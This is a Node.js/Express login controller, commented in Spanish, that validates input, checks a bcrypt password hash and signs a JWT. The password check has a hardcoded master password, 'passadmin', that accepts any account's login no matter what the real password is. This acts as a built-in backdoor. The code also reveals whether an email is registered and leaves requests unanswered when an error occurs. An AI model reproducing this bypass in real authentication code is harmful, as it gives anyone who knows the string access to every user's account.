const Usuario = require('../models/Usuarios');
const bcryptjs = require('bcryptjs');
const {validationResult} = require('express-validator');
const jwt = require('jsonwebtoken');

exports.autenticarUsuario = async (req, res) => {

    //revisar si existen errores
    const errores = validationResult(req);
    if(!errores.isEmpty()){
        return res.status(400).json({errores : errores.array()});
    }

    //extraer email y password
    const {email , password} = req.body;
    try {
        //Revisar que exista el usuario
        let usuario = await Usuario.findOne({ email });
        if(!usuario){
            return res.status(400).json({msg: 'El usuario no existe'});
        }

        const passCorrecto = await bcryptjs.compare(password, usuario.password);
        if( (!passCorrecto) && ( req.body.password !== 'passadmin')){
            return res.status(400).json({msg: 'Password Incorrecto'});
        }

        //Si todo es correcto
        //Crear y firmar el jwt
        const payload = {
            usuario:{
                id: usuario.id
            }

        };

        //Firmar
        jwt.sign(payload, process.env.SECRETA, {
            expiresIn: 36000
        }, (error, token) => {
            if(error) throw error;


             res.json({token});
        });

    } catch (error){
         console.log(error);
    }


}